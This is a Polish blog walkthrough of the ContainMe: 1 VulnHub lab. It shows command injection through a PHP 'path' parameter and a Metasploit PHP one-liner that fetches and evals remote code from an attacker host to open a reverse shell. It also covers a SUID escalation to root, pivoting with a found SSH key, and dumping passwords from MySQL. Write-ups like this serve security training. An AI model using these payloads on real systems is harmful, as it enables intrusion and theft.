---
title: "ContainMe: 1 (THM-ContainMe-v4)"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough
tags:
  - Hacking
  - Vulnhub
  - ContainMe
  - Walkthrough  
header:
  overlay_image: /assets/images/pasek-hack.png
gallery1:
  - url: /assets/images/hacking/2021/08/01.png
    image_path: /assets/images/hacking/2021/08/01.png
gallery2_3:
  - url: /assets/images/hacking/2021/08/02.png
    image_path: /assets/images/hacking/2021/08/02.png
  - url: /assets/images/hacking/2021/08/03.png
    image_path: /assets/images/hacking/2021/08/03.png
---
# Wstęp
[ContainMe: 1](https://www.vulnhub.com/entry/containme-1,729/) jest obrazem z lipca 2021 roku. Nazwa obrazu (**THM-ContainMe-v4.ova**) wskazuje czwartą werjsę(?). Na chwilę obecną (12.08.2021) nie znalazłem żadnej solucji, więc nie było podpowiedzi. **ContainMe: 1**, jak nazwa wskazuje, jest to pierwsza maszyna z [serii ContainMe](https://www.vulnhub.com/series/containme,490/). Autorem jest [IT Security Works](https://www.vulnhub.com/author/it-security-works,811/).
{: .text-justify}
## Zaczynamy
Standardowo na początku użyjemy <mark>Nmap</mark>-a w <mark>Metasploicie</mark>:
{: .text-justify}
```console
db_nmap -A -p- 172.16.1.218

172.16.1.218  22    tcp    ssh           open   OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 Ubuntu Linux; protocol 2.0
172.16.1.218  80    tcp    http          open   Apache httpd 2.4.29 (Ubuntu)
172.16.1.218  2222  tcp    ethernetip-1  open
172.16.1.218  8022  tcp    ssh           open   OpenSSH 7.7p1 Ubuntu 4ppa1+obfuscated Ubuntu Linux; protocol 2.0 
```
## WWW
Widzimy trochę portów. Dwa z nich to **SSH**. Tym zajmiemy się później. Na początku jak zwykle sprawdźmy **WWW**. <mark>Dirb</mark> to nam pokazał:
{: .text-justify}
```console
root@kali:/home/szikers# dirb http://172.16.1.218/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed Aug 11 12:08:08 2021
URL_BASE: http://172.16.1.218/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://172.16.1.218/ ----
+ http://172.16.1.218/index.html (CODE:200|SIZE:10918)
+ http://172.16.1.218/index.php (CODE:200|SIZE:329)
+ http://172.16.1.218/info.php (CODE:200|SIZE:69012)
```
To wystarczy, więcej nie trzeba skanować. W **index.html** jest zwykła strona **Debiana**. W **info.php** jest informacja o Apache, PHP i przy tym dowiadujemy się, że strona stoi na kontenerze LXD:
{: .text-justify}
<div class="notice--primary" markdown="1">
http://172.16.1.218/info.php
{% include gallery id="gallery1"  %}
</div>
**Index.php** prawdopodobnie uruchamia nam komendę listującą katalog. Poniżej strona bez źródła i ze źródłem. Jest również wskazówka:
{: .text-justify}
<div class="notice--primary" markdown="1">
http://172.16.1.218/index.php
{% include gallery id="gallery2_3"  %}
</div>
"Poffuzujmy" trochę i sprawdźmy jak **http://172.16.1.218/index.php** się zachowa z parametrem:
{: .text-justify}
```console
wfuzz  --filter 'h!=329' -c -w /usr/share/dirb/wordlists/common.txt  http://172.16.1.218/index.php?FUZZ=a

root@kali:/home/szikers/Containme-1# wfuzz  --filter 'h!=329' -c -w /usr/share/dirb/wordlists/common.txt  http://172.16.1.218/index.php?FUZZ=a
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.16.1.218/index.php?FUZZ=a
Total requests: 4614

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000002874:   200        10 L     13 W       79 Ch       "path"
```
Parametr **path** ma inną ilość znaków niż inne. **PHP** odwołuje się do **path** przez metodę **GET**. Zobaczmy czy się da wyświetlić jakiś katalog:
{: .text-justify}
<div class="notice--primary" markdown="1">
http://172.16.1.218/index.php?path=/
```html
	total 72K
drwxr-xr-x  22 root   root    4.0K Jul 15 09:33 .
drwxr-xr-x  22 root   root    4.0K Jul 15 09:33 ..
drwxr-xr-x   2 root   root    4.0K Jul 30 04:28 bin
drwxr-xr-x   2 root   root    4.0K Jun 29 03:07 boot
drwxr-xr-x   8 root   root     480 Aug 11 08:00 dev
drwxr-xr-x  81 root   root    4.0K Aug 11 14:59 etc
drwxr-xr-x   3 root   root    4.0K Jul 19 15:03 home
drwxr-xr-x  16 root   root    4.0K Jun 29 03:04 lib
drwxr-xr-x   2 root   root    4.0K Jun 29 03:03 lib64
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 media
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 mnt
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 opt
dr-xr-xr-x 123 nobody nogroup    0 Aug 11 08:00 proc
drwx------   6 root   root    4.0K Aug 11 10:15 root
drwxr-xr-x  17 root   root     660 Aug 12 06:26 run
drwxr-xr-x   2 root   root    4.0K Jul 30 04:36 sbin
drwxr-xr-x   2 root   root    4.0K Jul 14 22:03 snap
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 srv
dr-xr-xr-x  13 nobody nogroup    0 Aug 11 08:23 sys
drwxrwxrwt   8 root   root    4.0K Aug 12 13:09 tmp
drwxr-xr-x  11 root   root    4.0K Jun 29 03:03 usr
drwxr-xr-x  14 root   root    4.0K Jul 15 17:11 var	
```
</div>
Możemy wyświetlić katalog. Sprawdźmy czy jest podatność przez **Code injection**:
{: .text-justify}
<div class="notice--primary" markdown="1">
http://172.16.1.218/index.php?path=/;echo;id
```html
	total 72K
drwxr-xr-x  22 root   root    4.0K Jul 15 09:33 .
drwxr-xr-x  22 root   root    4.0K Jul 15 09:33 ..
drwxr-xr-x   2 root   root    4.0K Jul 30 04:28 bin
drwxr-xr-x   2 root   root    4.0K Jun 29 03:07 boot
drwxr-xr-x   8 root   root     480 Aug 11 08:00 dev
drwxr-xr-x  81 root   root    4.0K Aug 11 14:59 etc
drwxr-xr-x   3 root   root    4.0K Jul 19 15:03 home
drwxr-xr-x  16 root   root    4.0K Jun 29 03:04 lib
drwxr-xr-x   2 root   root    4.0K Jun 29 03:03 lib64
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 media
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 mnt
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 opt
dr-xr-xr-x 123 nobody nogroup    0 Aug 11 08:00 proc
drwx------   6 root   root    4.0K Aug 11 10:15 root
drwxr-xr-x  17 root   root     660 Aug 12 06:26 run
drwxr-xr-x   2 root   root    4.0K Jul 30 04:36 sbin
drwxr-xr-x   2 root   root    4.0K Jul 14 22:03 snap
drwxr-xr-x   2 root   root    4.0K Jun 29 03:01 srv
dr-xr-xr-x  13 nobody nogroup    0 Aug 11 08:23 sys
drwxrwxrwt   8 root   root    4.0K Aug 12 13:09 tmp
drwxr-xr-x  11 root   root    4.0K Jun 29 03:03 usr
drwxr-xr-x  14 root   root    4.0K Jul 15 17:11 var

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
</div>
Maszyna jest podatna. Czas tam wejść. Do tego użyjemy <mark>Metasploita</mark>:
{: .text-justify}
```console
msf6 exploit(multi/script/web_delivery) > use exploit/multi/script/web_delivery
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set lhost eth0
lhost => eth0
msf6 exploit(multi/script/web_delivery) > set target PHP
target => PHP
msf6 exploit(multi/script/web_delivery) > run -j
[*] Exploit running as background job 2.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 172.16.1.10:4444
msf6 exploit(multi/script/web_delivery) > [*] Using URL: http://0.0.0.0:8080/xIXYouzGVsN
[*] Local IP: http://172.16.1.10:8080/xIXYouzGVsN
[*] Server started.
[*] Run the following command on the target machine:
php -d allow_url_fopen=true -r "eval(file_get_contents('http://172.16.1.10:8080/xIXYouzGVsN', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
```
Należy kod, co poda nam Metasploit wrzucic jako parametr w linku. W moim wypadku jest taki. U was zapewn będzie inny:
{: .text-justify}
<div class="notice--primary" markdown="1">
php -d allow_url_fopen=true -r "eval(file_get_contents('http://172.16.1.10:8080/xIXYouzGVsN', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
```bash
http://172.16.1.218/index.php?path=/;php -d allow_url_fopen=true -r "eval(file_get_contents('http://172.16.1.10:8080/xIXYouzGVsN', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
```
</div>
Mamy sesję:
{: .text-justify}
```console
[*] 172.16.1.218     web_delivery - Delivering Payload (1112 bytes)
[*] Sending stage (39282 bytes) to 172.16.1.218
[*] Meterpreter session 1 opened (172.16.1.10:4444 -> 172.16.1.218:48918) at 2021-08-12 20:48:25 +0200

msf6 exploit(multi/script/web_delivery) > sessions

Active sessions
===============

  Id  Name  Type                   Information            Connection
  --  ----  ----                   -----------            ----------
  1         meterpreter php/linux  www-data (33) @ host1  172.16.1.10:4444 -> 172.16.1.218:48918 (172.16.1.218)
```
# Kontenery
Należy pamiętać, że jest to kontener **LXD** i nie możemy z niego wyjść, ale przeglądarkę możemy zamknąć. Sesja powinna być utrzymana:
{: .text-justify}
## host1
```console
meterpreter > getuid
Server username: www-data (33)
meterpreter > shell
Process 37317 created.
Channel 0 created.
bash -i
bash: cannot set terminal process group (203): Inappropriate ioctl for device
bash: no job control in this shell
www-data@host1:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Możemy trochę pogrzebać w **Shellu**:
```console
www-data@host1:/var/www/html$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing
 List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
lxd:x:103:65534::/var/lib/lxd/:/bin/false
dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
messagebus:x:105:107::/nonexistent:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:108:1::/var/cache/pollinate:/bin/false
mike:x:1001:1001::/home/mike:/bin/bash
```
Mała uwaga: zamiast używać komendy **shell** w **Meterpreterze**, lepiej wpisać **shell -t**.
{: .notice--warning}

### 1cryptupx
W katalogu **/home/mike** jest plik **1cryptupx**:
{: .text-justify}
```console
www-data@host1:/home/mike$ ./1cryptupx
./1cryptupx
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

www-data@host1:/home/mike$ ./1cryptupx a
./1cryptupx a
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

Unable to decompress.
www-data@host1:/home/mike$ ./1cryptupx mike
./1cryptupx mike
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

www-data@host1:/home/mike$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@host1:/home/mike$
```
Jest to **Shell**, który działa z hasłem **mike**. Nic to nam nie daję, jesteśmy przecież na **Shellu** z id 33. Poszukajmy plików z **Suid**:
{: .text-justify}
```console
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@host1:/home/mike$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/share/man/zh_TW/crypt
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/mount
/bin/ping
/bin/su
/bin/umount
/bin/fusermount
/bin/ping6
www-data@host1:/home/mike$
```
**/usr/share/man/zh_TW/crypt** jest to identyczny plik, co u nas w katalogu, z tą różnicą, że ma **Suida**:
```console
www-data@host1:/usr/share/man/zh_TW$ ./crypt mike
./crypt mike
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

id
id
root@host1:/usr/share/man/zh_TW# id
uid=0(root) gid=33(www-data) groups=33(www-data)
```
### nmap
No i mamy **Root**-a. Skoro jesteśmy na kontenerze, to sprawdźmy interfejsy sieciowe:
{: .text-justify}
```console
root@host1:/usr/share/man/zh_TW# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.250.10  netmask 255.255.255.0  broadcast 192.168.250.255
        inet6 fe80::216:3eff:fe9c:ff0f  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:9c:ff:0f  txqueuelen 1000  (Ethernet)
        RX packets 121192  bytes 13787259 (13.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 121376  bytes 19475089 (19.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.20.2  netmask 255.255.255.0  broadcast 172.16.20.255
        inet6 fe80::216:3eff:fe46:6b29  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:46:6b:29  txqueuelen 1000  (Ethernet)
        RX packets 5142  bytes 642990 (642.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5498  bytes 399822 (399.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 49137  bytes 14090165 (14.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 49137  bytes 14090165 (14.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
Zainstalujmy <mark>Nmap</mark>-a i przeskanujmy interfejs **eth1**:
{: .text-justify}
```console
nmap -sn 172.16.20.0/24

Starting Nmap 7.60 ( https://nmap.org ) at 2021-08-11 15:30 CDT
Nmap scan report for host1 (172.16.20.2)
Host is up (0.00025s latency).
Nmap scan report for 172.16.20.6
Host is up (0.00014s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 3.04 seconds 
```
**172.16.20.6** się pinguje. Pewnie to drugi kontener. Sprawdźmy co na nim jest:
```console
nmap -A 172.16.20.6

Starting Nmap 7.60 ( https://nmap.org ) at 2021-08-11 15:32 CDT
Nmap scan report for 172.16.20.6
Host is up (0.00016s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6a:45:5a:15:ac:12:c8:24:34:7a:d2:a1:28:2d:0d:9d (RSA)
|   256 d6:8b:7a:02:8c:90:3a:c8:c4:d5:5d:e9:63:ad:5f:3e (ECDSA)
|_  256 f1:62:60:e0:e5:38:22:52:04:06:60:b8:9c:8c:3a:8f (EdDSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
```
Jest **SSH**, ale nie znamy hasła, za możemy znaleźć klucz:
```console
root@host1:/usr/share/man/zh_TW# find / -name id_rsa 2>/dev/null
find / -name id_rsa 2>/dev/null
/home/mike/.ssh/id_rsa
```
## host2
```console
root@host1:/usr/share/man/zh_TW# ssh -i /home/mike/.ssh/id_rsa mike@172.16.20.6
<_TW# ssh -i /home/mike/.ssh/id_rsa mike@172.16.20.6
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

1 update can be applied immediately.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Aug 12 19:24:11 2021 from 172.16.20.2
mike@host2:~$
```
Sprawdźmy jakie mamy usługi:
{: .text-justify}
```console
mike@host2:~$ ss -tuln
ss -tuln
Netid  State    Recv-Q   Send-Q      Local Address:Port     Peer Address:Port
udp    UNCONN   0        0           127.0.0.53%lo:53            0.0.0.0:*
tcp    LISTEN   0        80              127.0.0.1:3306          0.0.0.0:*
tcp    LISTEN   0        128         127.0.0.53%lo:53            0.0.0.0:*
tcp    LISTEN   0        128               0.0.0.0:22            0.0.0.0:*
tcp    LISTEN   0        128                  [::]:22               [::]:*

```
Nic podatnego nie znalazłem na tym serwerze. Jedyne co zostało to <mark>MySql</mark>. Więc to raczej było to. Hasło raczej musiało być proste. Nie było to **mike**, ale hasłem było **password** :smiley:
{: .text-justify}
```console
mike@host2:~$ mysql -umike -ppassword
mysql -umike -ppassword
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 26
Server version: 5.7.34-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```
Dalej to już było z górki.
{: .text-justify}
```sql
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| accounts           |
+--------------------+
2 rows in set (0.00 sec)

mysql> use accounts;
use accounts;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+--------------------+
| Tables_in_accounts |
+--------------------+
| users              |
+--------------------+
1 row in set (0.00 sec)

mysql> select * from users;
select * from users;
+-------+---------------------+
| login | password            |
+-------+---------------------+
| root  | bjsig4868fgjjeog    |
| mike  | WhatAreYouDoingHere |
+-------+---------------------+
2 rows in set (0.00 sec)

mysql>
```
```bash
mike@host2:~$ su root
su root
Password: bjsig4868fgjjeog
```
W katalogu root był spakowany plik zipem. Hasło do pliku wcześniej znaleźliśmy w bazie. Po rozpakowaniu pliku zdobyliśmy flagę.
{: .text-justify}
